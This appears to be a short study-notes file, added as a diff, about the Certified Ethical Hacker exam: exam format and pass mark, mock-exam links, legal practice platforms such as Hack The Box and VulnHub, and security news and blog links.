+Exam Voucher validity : 1 Year from the date of submitting Evaluation
+Exam Duration: 4Hours
+125 MCQ 
+87 correct answer / 70%
+3years validity
+
+Mock Exam:
+https://www.skillset.com/certifications/ceh
+http://www.gocertify.com/quizzes/ceh/ceh1.html
+
+Practice:
+http://overthewire.org/wargames/
+https://www.vulnhub.com/
+https://www.hackthebox.eu/
+https://www.root-me.org/
+https://lab.pentestit.ru/
+https://attackdefense.com/*
+
+Hackers News and Updates:
+	https://gbhackers.com/
+
+Android App : https://play.google.com/store/apps/detailsid=com.briox.riversip.rnd.cybersecurity&hl=en
+
+Tools Updates:
+http://kitploit.com/	
+
+Blog: www.hackwithbkob.wordpress.com
+
+Images URL: https://drive.google.com/open?id=1iDLS9_EKqPQNmQiMVimyl-Gt320oNDXD
+
+Mail: nbharathkumara@gmail.com
